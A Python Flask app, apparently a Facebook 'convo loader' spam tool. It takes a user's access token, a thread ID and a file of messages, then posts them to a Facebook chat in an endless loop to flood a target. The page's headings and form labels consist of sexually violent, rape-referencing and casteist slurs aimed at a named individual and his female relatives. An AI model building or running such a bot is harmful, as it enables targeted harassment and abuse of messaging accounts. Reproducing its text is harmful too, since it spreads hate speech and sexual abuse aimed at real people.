from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title> ONFIRE-SHIVU BADMASH</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <html>
    <head>
        <style>
        body {
        background-image: url('https://i.postimg.cc/BnXwH9VQ/IMG-20250622-WA0123.jpg');
        background-size: cover;
    }
    body {
      font-family: Arial, sans-serif;
    }
    
    .container {
      width: 300px;
      margin: 0 auto;
      margin-top: 100px;
      border: 1px solid #ccc;
      padding: 20px;
    }
    
    .container label, .container input[type="text"], .container input[type="password"] {
      display: black;
      width: 100%;
      margin-bottom: 10px;
    }
    
    .container button {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
    }

    .container button:hover {
      background-color: #55a049;
    }
  </style>
    </head>
    <body>
  <header class="header mt-4">\
    <h1 class="mb-3" style="color: red;"> ( ~𝗔𝗟𝗟 𝗥𝗨𝗟𝗘𝗫 𝗖𝗛𝗢𝗗 <𝟯 𝗠𝗔𝗦𝗧𝗘𝗥 𝗦𝗛𝗜𝗩𝗨 𝗕𝗥𝗔𝗡𝗗 𝗧𝗥𝗜𝗖𝗞𝗘𝗥 𝗜𝗡𝗦𝗜𝗗𝗘 -)</h1>
    <h1 class="mt-3" style="color: White;"> (-𝗧𝗛𝗘 𝗠𝗢𝗦𝗧 𝗪𝗔𝗡𝗧𝗘𝗗 𝗖𝗥𝗜𝗠𝗜𝗡𝗔𝗟 𝗙𝗔𝗔𝗗𝗘𝗕𝗔𝗔𝗝 𝗕𝗢𝗜𝗜 𝗦𝗛𝗜𝗩𝗨 𝗫𝗪𝗗 𝗗𝗔𝗥𝗜𝗡𝗔 𝗛𝗘𝗥𝗘 -)</h1>
    <h1 class="mt-3" style="color: cyan;">  ISHAN JAISE 𝗚𝗔𝗥𝗘𝗘𝗕 𝗠𝗢𝗖𝗛𝗜 𝗞𝗜 𝗕𝗘𝗛𝗔𝗡 𝗞𝗢 𝗥𝗔𝗡𝗗𝗜 𝗕𝗔𝗡𝗔𝗞𝗘 𝗖𝗛𝗢𝗗𝗡𝗘 𝗪𝗔𝗟𝗔 SHIVU 𝗗𝗔𝗥𝗜𝗡𝗗𝗔 𝗛𝗘𝗥𝗘  -)
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken">𝗘𝗡𝗧𝗘𝗥 𝗧𝗢𝗞𝗘𝗡 𝗜𝗡 ISHAN'𝗦 𝗦𝗜𝗦𝗧𝗘𝗥 𝗣𝗨𝗦𝗦𝗬 :</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId">ISHAN 𝗞𝗜 𝗗𝗜𝗗𝗜 𝗞𝗜 𝗖𝗛𝗨𝗧 𝗞𝗔 𝗖𝗢𝗡𝗩𝗢 𝗜𝗗:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">ISHAN 𝗖𝗛𝗔𝗠𝗔𝗥 𝗞𝗜 𝗠𝗔 𝗞𝗔 𝗥𝗔𝗣𝗘 𝗞𝗥𝗡𝗘 𝗞𝗔 𝗟𝗜𝗬𝗘 𝗡𝗔𝗔𝗠. 𝗗𝗔𝗟𝗢 :</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">ISHAN 𝗞𝗜 𝗖𝗛𝗨𝗧 𝗠𝗔𝗜 𝗚𝗔𝗟𝗜 𝗗𝗔𝗟𝗢 :</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time"> ISHAN 𝗞𝗜 𝗗𝗜𝗗𝗜 𝗞𝗔 𝗖𝗛𝗨𝗗𝗔𝗜 𝗞𝗔 𝗧𝗜𝗠𝗘 𝗗𝗔𝗟𝗢 :</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">ISHAN 𝗞𝗜 𝗕𝗘𝗛𝗔𝗡 𝗞𝗜 𝗖𝗛𝗨𝗧 𝗠𝗔𝗜 𝗨𝗡𝗚𝗟𝗜 𝗞𝗥𝗢 </button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; Developed by  ISHAN 𝗝𝗘𝗦𝗘 𝗚𝗔𝗥𝗘𝗕𝗢 𝗞𝗢 𝗖𝗛𝗢𝗗𝗡𝗘 𝗪𝗔𝗟𝗔 𝗦𝗛𝗜𝗩𝗨 𝗗𝗔𝗥𝗜𝗡𝗗𝗔 𝗛𝗘𝗥𝗘 . All RULEX CHOD SHIVU TRICKER .</p>
    <p>Convo/Inbox Loader Tool king Shivu Dwn </p>
    <p>FB KE LIYE = https://www.facebook.com/messages/e2ee/t/7861669553948541 <a href="https://github.com/</a></p>
  </footer>
</body>
  </html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
